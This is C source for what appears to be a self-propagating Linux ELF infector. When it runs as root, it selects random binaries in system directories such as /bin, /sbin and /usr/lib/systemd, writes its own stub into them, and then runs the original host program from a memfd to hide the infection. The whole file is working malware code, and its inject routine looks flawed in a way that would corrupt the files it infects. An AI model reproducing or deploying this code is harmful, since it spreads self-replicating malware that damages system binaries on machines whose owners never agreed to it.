#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <time.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/mount.h>

#define STUB_SIZE 14488

#ifndef ARGESSIVENESS
	#define AGRESSIVENESS 10
#endif
static int self;
static char memfd_path[64];

static int mount_proc(void) {
	return mount("proc", "/proc", "proc", 0, NULL);
}

#if defined(PROPERGATE)

static const char * paths[] = {
	"/sbin",
	"/bin",
	"/usr/bin",
	"/usr/local/bin",
	"/usr/lib/systemd"
};
static int inject(const char * path, const char * me)
{
	const int exefd = open(path, O_WRONLY);
	const off_t exe_size = lseek(exefd, 0, SEEK_END);
	char * content =       malloc(STUB_SIZE + (unsigned long) exe_size);
	if (!content)
		return 0;
	memcpy(content, me, 256);
	if (STUB_SIZE > write(exefd, content, STUB_SIZE + (unsigned long) exe_size))
		return 0;
	return 1;
}

static int check_injected(const char * path)
{
	const int exefd = open(path, O_RDONLY);
	char exe[STUB_SIZE];
	char me[STUB_SIZE];
	if (STUB_SIZE > read(self, me, STUB_SIZE))
		return 0;
	if (STUB_SIZE > read(exefd, exe, STUB_SIZE))
	{
		inject(path, me);
		return 0;
	}
	close(exefd);
	for (int x = 0; x < 256; ++x)
	{
		if (me[x] == exe[x])
			continue;
		if (x < 5)
			break;
		inject(path, me);
		return 0;
	}
	return 1;
}

static void propergate(void)
{
	const clock_t start = clock();
	
	srand(time(NULL));
	while (1)
	{
		bool timeout = false;
		int entry_count = 0;
		const unsigned int rpath = (unsigned int) rand() % 5;
		DIR * dir = opendir(paths[rpath]);
		if (!dir)
			continue;
		
		struct dirent * entry;
		int file_count = 0;
		while ((entry = readdir(dir)) != NULL)
			if (entry->d_type == DT_REG)
				++file_count;
		rewinddir(dir);
		if (!file_count)
		{
			closedir(dir);
			continue;
		}
		
		while (1)
		{
			const int rindex = rand() % file_count;
			int index = 0;
			
			while ((entry = readdir(dir)) != NULL)
			{
				if (entry->d_type != DT_REG || index++ != rindex)
					continue;
				
				char file[512];
				sprintf(file, "%s/%s", paths[rpath], entry->d_name);
				check_injected(file);
				break;
			}
			rewinddir(dir);
			const clock_t stop = clock();
			if (stop - start > (CLOCKS_PER_SEC / 100) * AGRESSIVENESS)
			{
				timeout = true;
				break;
			}
			if (entry_count == 5)
				break;
			
			++entry_count;
		}
		if (timeout)
			break;
	}
}
#endif


static void load_elf(void)
{
	const int memfd = memfd_create("", 1);
	const off_t self_size = lseek(self, 0, SEEK_END);
	
	lseek   (self, STUB_SIZE, SEEK_SET);
	sendfile(memfd, self, NULL, (unsigned long) self_size - STUB_SIZE);
	sprintf (memfd_path, "/proc/self/fd/%d", memfd);
}

int main(const int c, char * v[], char * e[])
{
	(void)c;
	while (1)
	{
		self = open("/proc/self/exe", O_RDONLY);
		if (!self)
			mount_proc();
		else
			break;
	}
	
	#if defined(PROPERGATE)
	if (geteuid() == 0)
		propergate();
	#endif
	load_elf();
	close(self);
	return execve(memfd_path, v, e);
}
